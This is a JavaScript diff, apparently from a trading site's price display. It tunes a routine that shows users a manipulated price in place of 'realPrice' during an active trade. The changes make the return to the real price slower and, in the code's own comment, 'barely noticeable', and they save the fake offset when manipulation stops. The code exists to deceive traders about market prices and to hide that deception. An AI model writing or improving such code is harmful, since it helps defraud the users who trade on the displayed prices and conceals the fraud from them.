@@ -972,21 +972,20 @@
     
     if (manipulation.recovering) {
       const elapsed = now - manipulation.recoverStart;
-      const recoveryDuration = 30000; // 30 seconds recovery
+      const recoveryDuration = 45000; // 45 seconds recovery
       const progress = Math.min(elapsed / recoveryDuration, 1);
       
-      // Smooth ease-out
-      const curve = 1 - Math.pow(1 - progress, 2);
+      // Very gradual recovery - barely noticeable
+      const curve = Math.pow(progress, 2); // slow start, accelerates
       
       if (progress >= 1) {
         manipulation.recovering = false;
-        manipulation.lastManipulatedPrice = null;
+        manipulation.savedOffset = 0;
         return realPrice;
       }
       
-      // Calculate the offset that was applied at end of manipulation
-      const lastOffset = manipulation.lastManipulatedPrice - realPrice;
-      const currentOffset = lastOffset * (1 - curve);
+      // Use saved offset from end of manipulation
+      const currentOffset = manipulation.savedOffset * (1 - curve);
       
       return realPrice + currentOffset;
     }
@@ -1003,6 +1002,7 @@
     manipulation.startTime = Date.now();
     manipulation.duration = tradeData.duration * 1000;
     manipulation.recovering = false;
+    manipulation.savedOffset = 0;
     manipulation.noiseSeed = Math.random() * 1000;
     
     console.log('📈 Manipulation started:', {
@@ -1017,11 +1017,18 @@
   function stopManipulation() {
     if (!manipulation.active) return;
     
+    // Save the current offset for recovery
+    if (manipulation.lastManipulatedPrice && lastRealPrice) {
+      manipulation.savedOffset = manipulation.lastManipulatedPrice - lastRealPrice;
+    } else {
+      manipulation.savedOffset = 0;
+    }
+    
     manipulation.active = false;
     manipulation.recovering = true;
     manipulation.recoverStart = Date.now();
     
-    console.log('📉 Manipulation stopped, recovery started');
+    console.log('📉 Manipulation stopped, recovery started, offset:', manipulation.savedOffset);
   }
 
   // ===== CHECK FOR ACTIVE TRADE ON LOAD =====
